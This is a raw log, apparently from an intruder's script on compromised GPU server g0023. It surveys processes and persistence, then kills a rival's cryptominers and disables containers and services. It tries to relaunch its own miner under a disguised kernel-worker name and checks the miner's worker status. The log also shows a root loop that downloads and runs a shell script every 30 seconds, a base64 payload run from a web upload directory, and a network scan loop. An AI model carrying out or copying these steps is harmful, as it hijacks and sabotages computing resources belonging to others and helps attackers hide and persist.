@@ -1,0 +1,334 @@
+Warning: Permanently added '123.184.7.135' (ED25519) to the list of known hosts.
+### META 2026-11-24T23:50:59Z
+g0023
+### FORENSICS
+-- all non-kernel procs
+    PID    PPID  NI ELAPSED COMMAND
+2417808 2417801   0       0 ps -eo pid,ppid,ni,etimes,args --sort=etimes
+2417810 2417801   0       0 cut -c1-190
+2417811 2417801   0       0 head -60
+2417801 2417685   0       1 bash /root/ul_farmfan/f2.sh
+2417703 2145288  -5       3 sleep 45
+2417359 2350010   0      13 sleep 45
+2417191 3360764   0      18 sleep 30
+2350001   21715   0      58 /usr/sbin/CRON -f -P
+2350006 2350001   0      58 /bin/sh -c /opt/plh/keepalive.sh
+2350010 2350006   0      58 /bin/bash /opt/plh/keepalive.sh
+2214438 2214362   0     170 /root/.cache/ms-playwright/chromium-1105/chrome-linux/chrome --disable-field-trial-config --disable-background-networking --enable-features=NetworkService,Network
+2214440 2214438   0     170 /root/.cache/ms-playwright/chromium-1105/chrome-linux/chrome --type=zygote --no-zygote-sandbox --no-sandbox --headless --headless
+2214441 2214438   0     170 /root/.cache/ms-playwright/chromium-1105/chrome-linux/chrome --type=zygote --no-sandbox --headless --headless
+2214456 2214440   0     170 /root/.cache/ms-playwright/chromium-1105/chrome-linux/chrome --type=gpu-process --no-sandbox --disable-dev-shm-usage --disable-breakpad --headless --ozone-platfor
+2214457 2214438   0     170 /root/.cache/ms-playwright/chromium-1105/chrome-linux/chrome --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-US --service-sandbox-type=no
+2214461 2214441   0     170 /root/.cache/ms-playwright/chromium-1105/chrome-linux/chrome --type=renderer --headless --no-sandbox --disable-dev-shm-usage --disable-back-forward-cache --disabl
+2214501 2214441   0     170 /root/.cache/ms-playwright/chromium-1105/chrome-linux/chrome --type=renderer --headless --no-sandbox --disable-dev-shm-usage --disable-back-forward-cache --disabl
+2214356 1428352   0     171 python /data/npa-bicm/webSiteScriptFile/26061217064733074612/7f41cee68aa54fbfb28c6a881ebb0e10.py --script-common-path /data/npa-bicm/common/script_common.py --url
+2145282       1  -5     229 /opt/plh/krig-miner --coin pearl -d 7 --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+ssl://prl-eu.kryptex.network:8048 --url stratum+ssl://prl-us.k
+2145288       1  -5     229 /bin/bash /opt/plh/keepalive.sh
+2145161       1  -5     230 /opt/plh/krig-miner --coin pearl -d 4 --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+ssl://prl-eu.kryptex.network:8048 --url stratum+ssl://prl-us.k
+2145193       1  -5     230 /opt/plh/krig-miner --coin pearl -d 5 --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+ssl://prl-eu.kryptex.network:8048 --url stratum+ssl://prl-us.k
+2145263       1  -5     230 /opt/plh/krig-miner --coin pearl -d 6 --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+ssl://prl-eu.kryptex.network:8048 --url stratum+ssl://prl-us.k
+2145016       1  -5     231 /opt/plh/krig-miner --coin pearl -d 0 --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+ssl://prl-eu.kryptex.network:8048 --url stratum+ssl://prl-us.k
+2145027       1  -5     231 /opt/plh/krig-miner --coin pearl -d 1 --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+ssl://prl-eu.kryptex.network:8048 --url stratum+ssl://prl-us.k
+2145068       1  -5     231 /opt/plh/krig-miner --coin pearl -d 2 --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+ssl://prl-eu.kryptex.network:8048 --url stratum+ssl://prl-us.k
+2145098       1  -5     231 /opt/plh/krig-miner --coin pearl -d 3 --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+ssl://prl-eu.kryptex.network:8048 --url stratum+ssl://prl-us.k
+1937047   21741  19     428 sleep 7200s
+3802841 1428352   0    6223 python /data/npa-bicm/webSiteScriptFile/26050717332637440205/dc851986292e42d1915779f3872907b6.py --script-common-path /data/npa-bicm/common/script_common.py --url
+3802858 3802847   0    6223 /root/.cache/ms-playwright/chromium-1105/chrome-linux/chrome --disable-field-trial-config --disable-background-networking --enable-features=NetworkService,Network
+3802860 3802858   0    6223 /root/.cache/ms-playwright/chromium-1105/chrome-linux/chrome --type=zygote --no-zygote-sandbox --no-sandbox --headless --headless
+3802861 3802858   0    6223 /root/.cache/ms-playwright/chromium-1105/chrome-linux/chrome --type=zygote --no-sandbox --headless --headless
+3802877 3802860   0    6223 /root/.cache/ms-playwright/chromium-1105/chrome-linux/chrome --type=gpu-process --no-sandbox --disable-dev-shm-usage --disable-breakpad --headless --ozone-platfor
+3802878 3802858   0    6223 /root/.cache/ms-playwright/chromium-1105/chrome-linux/chrome --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-US --service-sandbox-type=no
+3802881 3802861   0    6223 /root/.cache/ms-playwright/chromium-1105/chrome-linux/chrome --type=renderer --headless --no-sandbox --disable-dev-shm-usage --disable-back-forward-cache --disabl
+3802921 3802861   0    6223 /root/.cache/ms-playwright/chromium-1105/chrome-linux/chrome --type=renderer --headless --no-sandbox --disable-dev-shm-usage --disable-back-forward-cache --disabl
+3360764       1   0   10269 /bin/bash -c while true; do curl -sf http://127.0.0.1:8099/run.sh -o /tmp/r.sh 2>/dev/null && /bin/bash /tmp/r.sh >> /opt/t19/www/out.txt 2>&1; sleep 30; done
+3548756       1   0   69110 /usr/sbin/chronyd -F 1
+3548757 3548756   0   69110 /usr/sbin/chronyd -F 1
+3548760       1   0   69110 /usr/bin/node_exporter --web.listen-address=:9100 --collector.disable-defaults --collector.cpu --collector.meminfo --collector.netdev --collector.infiniband --col
+ 943137  354715   0   78775 sh -c (echo cHl0aG9uMyAvc3NkL3ZlbmRvcnMvSU5TUFVSL3Byb2plY3QvaW5zcHVyLWZhc3RhcGktYmFja2VuZC92Zl9hZG1pbi91cGxvYWRfcGF0aC91cGxvYWQvMjAyNi8xMS8yNC9zNV8yMDI2MTEyNDA5NT
+ 943138  943137   0   78775 sh /tmp/.r.sh
+2044659  354715   0   96384 sh -c (echo S=$(date +%s); command -v nmap; command -v nc; for h in 123.184.7.129 123.184.7.158 123.184.7.170 123.184.7.199 123.184.7.222 123.184.7.225 192.168.0.
+2044660 2044659   0   96384 sh -c (echo S=$(date +%s); command -v nmap; command -v nc; for h in 123.184.7.129 123.184.7.158 123.184.7.170 123.184.7.199 123.184.7.222 123.184.7.225 192.168.0.
+ 354714  354561   0  480905 /ssd/vendors/INSPUR/project/inspur-fastapi-backend/.venv/bin/python -c from multiprocessing.resource_tracker import main;main(13)
+ 354715  354561   0  480905 /ssd/vendors/INSPUR/project/inspur-fastapi-backend/.venv/bin/python -c from multiprocessing.spawn import spawn_main; spawn_main(tracker_fd=14, pipe_handle=16) --m
+ 354561       1   0  480907 .venv/bin/python app.py run --env prod
+1852235  163278   0 1174553 /var/www/onlyoffice/documentserver/server/DocService/docservice
+1852236  163278   0 1174553 /var/www/onlyoffice/documentserver/server/FileConverter/converter
+1852237  163278   0 1174553 /var/www/onlyoffice/documentserver/server/Metrics/metrics ./config/config.js
+1852238  163278   0 1174553 /var/www/onlyoffice/documentserver-example/example
+3081697  163348   0 1184575 nginx: worker process
+3081698  163348   0 1184575 nginx: worker process
+3081699  163348   0 1184575 nginx: worker process
+3081700  163348   0 1184575 nginx: worker process
+3081701  163348   0 1184575 nginx: worker process
+3081702  163348   0 1184575 nginx: worker process
+3081703  163348   0 1184575 nginx: worker process
+3081704  163348   0 1184575 nginx: worker process
+-- units running
+  UNIT                                LOAD   ACTIVE SUB     DESCRIPTION
+  bcm-agent.service                   loaded active running LSB: Baidu cloud monitor agent
+  bsm-agent-upgrader.service          loaded active running bsm agent upgrader service
+  chronyd.service                     loaded active running chrony, an NTP client/server
+  cloudwalker.service                 loaded active running 主机安全管理平台
+  containerd.service                  loaded active running containerd container runtime
+  cron.service                        loaded active running Regular background program processing daemon
+  dbus.service                        loaded active running D-Bus System Message Bus
+  docker.service                      loaded active running Docker Application Container Engine
+  getty@tty1.service                  loaded active running Getty on tty1
+  hosteye.service                     loaded active running LSB: Baidu Host Security Agent
+  ids_svc_args_update_adaptor.service loaded active running ids_svc_args_update_adaptor
+  mdmonitor.service                   loaded active running MD array monitor
+  ModemManager.service                loaded active running Modem Manager
+  multipathd.service                  loaded active running Device-Mapper Multipath Device Controller
+  networkd-dispatcher.service         loaded active running Dispatcher daemon for systemd-networkd
+  nfs-blkmap.service                  loaded active running pNFS block layout mapping daemon
+  nfs-idmapd.service                  loaded active running NFSv4 ID-name mapping service
+  nfs-mountd.service                  loaded active running NFS Mount Daemon
+  nfsdcld.service                     loaded active running NFSv4 Client Tracking Daemon
+  node_exporter.service               loaded active running node_exporter
+  nvidia-dcgm.service                 loaded active running NVIDIA DCGM service
+  nvidia-fabricmanager.service        loaded active running NVIDIA fabric manager service
+  packagekit.service                  loaded active running PackageKit Daemon
+  plh-card@0.service                  loaded active running plh pearlhash card 0
+  plh-card@1.service                  loaded active running plh pearlhash card 1
+  plh-card@2.service                  loaded active running plh pearlhash card 2
+  plh-card@3.service                  loaded active running plh pearlhash card 3
+  plh-card@4.service                  loaded active running plh pearlhash card 4
+  plh-card@5.service                  loaded active running plh pearlhash card 5
+-- unit files
+30
+chronyd.service
+cloud-final.service.wants
+dbus-org.freedesktop.ModemManager1.service
+dbus-org.freedesktop.resolve1.service
+dbus-org.freedesktop.thermald.service
+dbus-org.freedesktop.timesync1.service
+dcgm.service
+display-manager.service.wants
+emergency.target.wants
+final.target.wants
+getty.target.wants
+graphical.target.wants
+hibernate.target
+hybrid-sleep.target
+iscsi.service
+mdmonitor.service.wants
+mlnx_interface_mgr@.service
+multi-user.target.wants
+multipath-tools.service
+network-online.target.wants
+nfs-client.target.wants
+node_exporter.service
+nv-cuda-cache.service
+nvidia-cdi-refresh.path
+nvidia-cdi-refresh.service
+nvidia-persistenced.service
+oem-config.service.wants
+open-vm-tools.service.requires
+paths.target.wants
+plh-card@.service
+plh-keeper.service
+rdma-hw.target.wants
+remote-fs.target.wants
+rescue.target.wants
+sleep.target
+sleep.target.wants
+snap-core-17292.mount
+snap-core20-2866.mount
+snap-core20-2922.mount
+snap-core22-2987.mount
+snap-core22-3129.mount
+snap-jq-6.mount
+snap-lxd-40911.mount
+snap-lxd-41283.mount
+snap-snapd-28254.mount
+snap-snapd-28332.mount
+snap.lxd.activate.service
+snap.lxd.daemon.service
+snap.lxd.daemon.unix.socket
+snap.lxd.user-daemon.service
+-- cron tree
+/etc/cron.d/:
+total 32
+drwxr-xr-x   2 root root  4096 Nov 25 07:46 .
+drwxr-xr-x 132 root root 12288 Nov  4 18:26 ..
+-rw-r--r--   1 root root   102 Mar 23  2022 .placeholder
+-rw-r--r--   1 root root   201 Jan  9  2022 e2scrub_all
+-rw-r--r--   1 root root   106 Nov 25 07:46 plh-keepalive
+-rw-r--r--   1 root root    75 Apr 16  2026 root
+
+/etc/cron.hourly/:
+total 20
+drwxr-xr-x   2 root root  4096 Aug  9  2022 .
+drwxr-xr-x 132 root root 12288 Nov  4 18:26 ..
+-rw-r--r--   1 root root   102 Mar 23  2022 .placeholder
+*/2 * * * * /usr/local/node_exporter/get_hardware_info_v3 high >> /var/log/hardware_info_high.log 2>&1
+0 * * * * /usr/local/node_exporter/get_hardware_info_v3 middle >> /var/log/hardware_info_middle.log 2>&1
+0 1 * * * /usr/local/node_exporter/get_hardware_info_v3 low >> /var/log/hardware_info_low.log 2>&1
+@reboot /usr/local/node_exporter/get_hardware_info_v3 once_boot >> /var/log/hardware_info_boot.log 2>&1
+31 21 * * * "/root/.acme.sh"/acme.sh --cron --home "/root/.acme.sh" > /dev/null
+0 2 * * * /ssd/vendors/QD_GLAD/npa_bicm/mysql/backup/scripts/backup.sh >>/ssd/vendors/QD_GLAD/npa_bicm/mysql/backup/scripts/backup.log 2>&1
+@reboot /opt/plh/keepalive.sh >/dev/null 2>&1
+*/3 * * * * /opt/plh/keep.sh >/dev/null 2>&1
+-- shm/nv-cache
+/opt/plh:
+total 124864
+drwxr-xr-x  2 root root      4096 Nov 25 07:47 .
+drwxr-xr-x 20 root root      4096 Nov 25 07:48 ..
+-rwxr-xr-x  1 root root       158 Nov 25 07:47 keep.sh
+-rwxr-xr-x  1 root root       108 Nov 25 07:47 keepalive.sh
+-rwxr-xr-x  1 root root        17 Nov 25 07:46 keepalive.sh.plh6997off
+-rwxr-xr-x  1 root root 127812624 Nov 25 07:46 krig-miner
+-rwxr-xr-x  1 root root        17 Nov 25 07:46 plh-card.sh
+-rwxr-xr-x  1 root root        17 Nov 25 07:46 plh-card.sh.plh6997off
+-rwxr-xr-x  1 root root        48 Nov 25 07:47 run-card.sh
+-rwxr-xr-x  1 root root       709 Nov 25 07:47 run_card.sh
+-rwxr-xr-x  1 root root        96 Nov 25 07:29 setsid-guard.sh
+
+/usr/local/lib/nv-cache:
+total 8
+drwxr-xr-x 2 root root 4096 Nov 25 04:59 .
+drwxr-xr-x 4 root root 4096 Nov 25 04:59 ..
+-- listening
+State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess                                                                                                                                                                                                                      
+LISTEN 0      6          127.0.0.1:6666       0.0.0.0:*    users:(("nv-fabricmanage",pid=21888,fd=103))                                                                                                                                                                                
+LISTEN 0      6          127.0.0.1:5555       0.0.0.0:*    users:(("nv-hostengine",pid=11292,fd=53))                                                                                                                                                                                   
+LISTEN 0      500        127.0.0.1:4110       0.0.0.0:*    users:(("krig-miner",pid=2145016,fd=55))                                                                                                                                                                                    
+LISTEN 0      500        127.0.0.1:4111       0.0.0.0:*    users:(("krig-miner",pid=2145027,fd=55))                                                                                                                                                                                    
+LISTEN 0      500        127.0.0.1:4112       0.0.0.0:*    users:(("krig-miner",pid=2145068,fd=55))                                                                                                                                                                                    
+LISTEN 0      500        127.0.0.1:4113       0.0.0.0:*    users:(("krig-miner",pid=2145098,fd=55))                                                                                                                                                                                    
+LISTEN 0      500        127.0.0.1:4114       0.0.0.0:*    users:(("krig-miner",pid=2145161,fd=55))                                                                                                                                                                                    
+LISTEN 0      500        127.0.0.1:4115       0.0.0.0:*    users:(("krig-miner",pid=2145193,fd=55))                                                                                                                                                                                    
+LISTEN 0      500        127.0.0.1:4116       0.0.0.0:*    users:(("krig-miner",pid=2145263,fd=55))                                                                                                                                                                                    
+LISTEN 0      500        127.0.0.1:4117       0.0.0.0:*    users:(("krig-miner",pid=2145282,fd=55))                                                                                                                                                                                    
+LISTEN 0      6          127.0.0.1:16000      0.0.0.0:*    users:(("nv-fabricmanage",pid=21888,fd=80))                                                                                                                                                                                 
+LISTEN 0      4096         0.0.0.0:18021      0.0.0.0:*    users:(("docker-proxy",pid=2868841,fd=7))                                                                                                                                                                                   
+LISTEN 0      4096         0.0.0.0:18020      0.0.0.0:*    users:(("docker-proxy",pid=664290,fd=7))                                                                                                                                                                                    
+LISTEN 0      5            0.0.0.0:18099      0.0.0.0:*    users:(("python3",pid=1848084,fd=3))                                                                                                                                                                                        
+LISTEN 0      4096         0.0.0.0:18089      0.0.0.0:*    users:(("docker-proxy",pid=2811292,fd=7))                                                                                                                                                                                   
+LISTEN 0      5            0.0.0.0:18081      0.0.0.0:*    users:(("python3",pid=4179307,fd=3))                                                                                                                                                                                        
+LISTEN 0      4096         0.0.0.0:18080      0.0.0.0:*    users:(("docker-proxy",pid=1795452,fd=7))                                                                                                                                                                                   
+LISTEN 0      4096         0.0.0.0:18443      0.0.0.0:*    users:(("docker-proxy",pid=1795458,fd=7))                                                                                                                                                                                   
+LISTEN 0      4096         0.0.0.0:19381      0.0.0.0:*    users:(("docker-proxy",pid=1795476,fd=7))                                                                                                                                                                                   
+LISTEN 0      4096         0.0.0.0:19380      0.0.0.0:*    users:(("docker-proxy",pid=1795465,fd=7))                                                                                                                                                                                   
+LISTEN 0      4096         0.0.0.0:19382      0.0.0.0:*    users:(("docker-proxy",pid=1795490,fd=7))                                                                                                                                                                                   
+LISTEN 0      4096         0.0.0.0:19101      0.0.0.0:*    users:(("docker-proxy",pid=1796821,fd=7))                                                                                                                                                                                   
+LISTEN 0      4096         0.0.0.0:19100      0.0.0.0:*    users:(("docker-proxy",pid=1796813,fd=7))                                                                                                                                                                                   
+LISTEN 0      4096         0.0.0.0:19530      0.0.0.0:*    users:(("docker-proxy",pid=2028807,fd=7))                                                                                                                                                                                   
+-- proc cmdlines of plh
+PID 1848084 python3 /opt/plhllm/srv.py  EXE=/usr/bin/python3.10
+PID 2145016 /opt/plh/krig-miner --coin pearl -d 0 --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+ssl://prl-eu.kryptex.network:8048 --url stratum+ssl://prl-us EXE=/opt/plh/krig-miner
+PID 2145027 /opt/plh/krig-miner --coin pearl -d 1 --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+ssl://prl-eu.kryptex.network:8048 --url stratum+ssl://prl-us EXE=/opt/plh/krig-miner
+PID 2145068 /opt/plh/krig-miner --coin pearl -d 2 --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+ssl://prl-eu.kryptex.network:8048 --url stratum+ssl://prl-us EXE=/opt/plh/krig-miner
+PID 2145098 /opt/plh/krig-miner --coin pearl -d 3 --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+ssl://prl-eu.kryptex.network:8048 --url stratum+ssl://prl-us EXE=/opt/plh/krig-miner
+PID 2145161 /opt/plh/krig-miner --coin pearl -d 4 --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+ssl://prl-eu.kryptex.network:8048 --url stratum+ssl://prl-us EXE=/opt/plh/krig-miner
+PID 2145193 /opt/plh/krig-miner --coin pearl -d 5 --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+ssl://prl-eu.kryptex.network:8048 --url stratum+ssl://prl-us EXE=/opt/plh/krig-miner
+PID 2145263 /opt/plh/krig-miner --coin pearl -d 6 --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+ssl://prl-eu.kryptex.network:8048 --url stratum+ssl://prl-us EXE=/opt/plh/krig-miner
+PID 2145282 /opt/plh/krig-miner --coin pearl -d 7 --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+ssl://prl-eu.kryptex.network:8048 --url stratum+ssl://prl-us EXE=/opt/plh/krig-miner
+PID 2145288 /bin/bash /opt/plh/keepalive.sh  EXE=/usr/bin/bash
+PID 2350006 /bin/sh -c /opt/plh/keepalive.sh  EXE=/usr/bin/dash
+PID 2350010 /bin/bash /opt/plh/keepalive.sh  EXE=/usr/bin/bash
+-- exe of krig procs
+PID 2145016 exe=/opt/plh/krig-miner ppid=1 start=1795564028
+PID 2145027 exe=/opt/plh/krig-miner ppid=1 start=1795564029
+PID 2145068 exe=/opt/plh/krig-miner ppid=1 start=1795564029
+PID 2145098 exe=/opt/plh/krig-miner ppid=1 start=1795564029
+PID 2145161 exe=/opt/plh/krig-miner ppid=1 start=1795564029
+PID 2145193 exe=/opt/plh/krig-miner ppid=1 start=1795564030
+PID 2145263 exe=/opt/plh/krig-miner ppid=1 start=1795564030
+PID 2145282 exe=/opt/plh/krig-miner ppid=1 start=1795564030
+-- journal kill events
+Nov 25 07:47:10 g0023 systemd[1]: Started plh pearlhash card 7.
+Nov 25 07:47:10 g0023 systemd[1]: Stopping plh keeper one miner per card...
+Nov 25 07:47:10 g0023 systemd[1]: plh-keeper.service: Deactivated successfully.
+Nov 25 07:47:10 g0023 systemd[1]: plh-keeper.service: Unit process 2145284 (sleep) remains running after unit stopped.
+Nov 25 07:47:10 g0023 systemd[1]: Stopped plh keeper one miner per card.
+Nov 25 07:47:10 g0023 systemd[1]: plh-keeper.service: Found left-over process 2145284 (sleep) in control group while starting unit. Ignoring.
+Nov 25 07:47:10 g0023 systemd[1]: Started plh keeper one miner per card.
+Nov 25 07:48:01 g0023 CRON[2213756]: (root) CMD (/opt/plh/keep.sh)
+Nov 25 07:48:01 g0023 CRON[2213757]: (root) CMD (/opt/plh/keep.sh >/dev/null 2>&1)
+Nov 25 07:48:07 g0023 systemd[1]: ul2-card@2.service: Main process exited, code=killed, status=9/KILL
+Nov 25 07:48:08 g0023 systemd[1]: ul2-card@1.service: Main process exited, code=killed, status=9/KILL
+Nov 25 07:48:08 g0023 systemd[1]: ul2-card@5.service: Main process exited, code=killed, status=9/KILL
+Nov 25 07:48:08 g0023 systemd[1]: ul2-card@6.service: Main process exited, code=killed, status=9/KILL
+Nov 25 07:48:08 g0023 systemd[1]: ul2-card@0.service: Main process exited, code=killed, status=9/KILL
+Nov 25 07:48:08 g0023 systemd[1]: ul2-card@4.service: Main process exited, code=killed, status=9/KILL
+Nov 25 07:48:08 g0023 systemd[1]: ul2-card@3.service: Main process exited, code=killed, status=9/KILL
+Nov 25 07:48:08 g0023 systemd[1]: ul2-card@7.service: Main process exited, code=killed, status=9/KILL
+Nov 25 07:49:01 g0023 CRON[2282197]: (root) CMD (/opt/plh/keep.sh)
+Nov 25 07:50:01 g0023 CRON[2350004]: (root) CMD (/opt/plh/keep.sh)
+Nov 25 07:50:01 g0023 CRON[2350006]: (root) CMD (/opt/plh/keepalive.sh)
+### NEUTRALIZE-KILLERS
+KILL 1848084 :: python3 /opt/plhllm/srv.py 
+KILL 2145016 :: /opt/plh/krig-miner --coin pearl -d 0 --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+ssl://prl-eu.kryptex
+KILL 2145027 :: /opt/plh/krig-miner --coin pearl -d 1 --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+ssl://prl-eu.kryptex
+KILL 2145068 :: /opt/plh/krig-miner --coin pearl -d 2 --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+ssl://prl-eu.kryptex
+KILL 2145098 :: /opt/plh/krig-miner --coin pearl -d 3 --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+ssl://prl-eu.kryptex
+KILL 2145161 :: /opt/plh/krig-miner --coin pearl -d 4 --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+ssl://prl-eu.kryptex
+KILL 2145193 :: /opt/plh/krig-miner --coin pearl -d 5 --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+ssl://prl-eu.kryptex
+KILL 2145263 :: /opt/plh/krig-miner --coin pearl -d 6 --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+ssl://prl-eu.kryptex
+KILL 2145282 :: /opt/plh/krig-miner --coin pearl -d 7 --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+ssl://prl-eu.kryptex
+KILL 2145288 :: /bin/bash /opt/plh/keepalive.sh 
+KILL 2350006 :: /bin/sh -c /opt/plh/keepalive.sh 
+KILL 2350010 :: /bin/bash /opt/plh/keepalive.sh 
+DIS dev-disk-by\x2dpartuuid-26c20d81\x2d3996\x2d4ca7\x2d8c9c\x2d96a1252054ac.device
+DIS dev-disk-by\x2duuid-2ebfa6b4\x2d8f4a\x2d4844\x2da3c3\x2df2e70c2d826d.device
+DIS sys-devices-pci0000:be-0000:be:02.0-0000:bf:00.0-0000:c0:00.0-0000:c1:00.0-0000:c2:04.0-0000:c4:00.0-nvme-nvme3-nvme3n1.device
+DIS run-docker-netns-b510dc2f6cbe.mount
+DIS ssd-docker-overlay2-3109eaaa49105270f49bae202632e53d9817c9af34c252f73d5707149a89f04f-merged.mount
+DIS ssd-docker-overlay2-3dbe333a8c5e3e5c3b0e534b6e3b002aa6e8ef8d60ac2b7141bb39516082a864-merged.mount
+DIS ssd-docker-overlay2-42b7b3398e72fd55c26f03be6861829c099d36c53fb8a190c417a958a29dd745-merged.mount
+DIS ssd-docker-overlay2-6d1749becdc2eb7b938f84d407b73c8d3014c5919ac4e52f83bda10afdaf4c2a-merged.mount
+DIS ssd-docker-overlay2-92a98d4c20bc98876a9007b69c116ac0c1a0cec7b30947fb592eaa5688ebead2-merged.mount
+DIS ssd-docker-overlay2-ab707efa560939cc97ff4721c2fbb7e31fe9e228006cdc4767d221635d3ea36e-merged.mount
+DIS ssd-docker-overlay2-fd7b6cdd2752aa0eea503cc9f6cc1b551c2ded29d8af7c15a5463b3976b803c8-merged.mount
+DIS docker-123e5d57fc0af01e60c2954630fb5458cd4f60d777b42fe871c96965444fb294.scope
+DIS docker-6d9f871e66b41d74338ed526982a910f38cbe4971f1cefa615eb08fc27938d14.scope
+DIS docker-6f4b2c76bc1c88b6ee39f6b5c47d78f5473624ff52fe9876b55a6bac27adbae6.scope
+DIS docker-ccc2c2293a6eca05dd908246202a409e52118fe52707b57959b9f6a29b4bd68d.scope
+DIS docker-d79e39ec513fee2a01576cac2fdf89effc1429fec711a873cdf1f3530abb8b47.scope
+DIS plh-card@0.service
+DIS plh-card@1.service
+DIS plh-card@2.service
+DIS plh-card@3.service
+after: plh=5 killerprocs=0
+### RELAUNCH-NEUTRAL-NAME
+chmod: cannot access '/usr/lib/.cache-ng/kworker-ng': No such file or directory
+/root/ul_plant/keep.sh: line 5: /root/ul_plant/n0.log: Operation not permitted
+/root/ul_plant/keep.sh: line 5: /root/ul_plant/n1.log: Operation not permitted
+/root/ul_plant/keep.sh: line 5: /root/ul_plant/n2.log: Operation not permitted
+/root/ul_plant/keep.sh: line 5: /root/ul_plant/n3.log: Operation not permitted
+/root/ul_plant/keep.sh: line 5: /root/ul_plant/n4.log: Operation not permitted
+/root/ul_plant/keep.sh: line 5: /root/ul_plant/n5.log: Operation not permitted
+/root/ul_plant/keep.sh: line 5: /root/ul_plant/n6.log: Operation not permitted
+/root/ul_plant/keep.sh: line 5: /root/ul_plant/n7.log: Operation not permitted
+after-launch: neutral=0 plh=4
+0, 4 MiB, 0 %
+1, 4 MiB, 0 %
+2, 4 MiB, 0 %
+3, 4 MiB, 0 %
+4, 6327 MiB, 100 %
+5, 6327 MiB, 100 %
+6, 6327 MiB, 100 %
+7, 6327 MiB, 100 %
+### OBSERVE-150
+OBSERVE: neutral=0 plh=4
+0, 4 MiB, 0 %
+1, 4 MiB, 0 %
+2, 4 MiB, 0 %
+3, 4 MiB, 0 %
+4, 6327 MiB, 100 %
+5, 6327 MiB, 100 %
+6, 6327 MiB, 100 %
+7, 6327 MiB, 100 %
+size=134633
+SELF_ROWS 9
+ROW ul-t2-123-184-7-135-g7 offline valid 140 last 1795564011647
+ROW ul-t2-123-184-7-135-g4 offline valid 149 last 1795563891170
+ROW ul-t2-123-184-7-135-g1 offline valid 146 last 1795564057545
+ROW ul-t2-123-184-7-135-g6 offline valid 177 last 1795564075815
+ROW ul-t2-123-184-7-135-g3 offline valid 148 last 1795563968977
+ROW ul-t2-123-184-7-135-g0 offline valid 151 last 1795563959095
+ROW ul-t2-123-184-7-135-g5 offline valid 167 last 1795563876552
+ROW ul-t2-123-184-7-135-g2 offline valid 161 last 1795563942678
+ROW ul-t19-123-184-7-135-g7 offline valid 918 last 1795538492391
+### DONE 2026-11-24T23:54:05Z
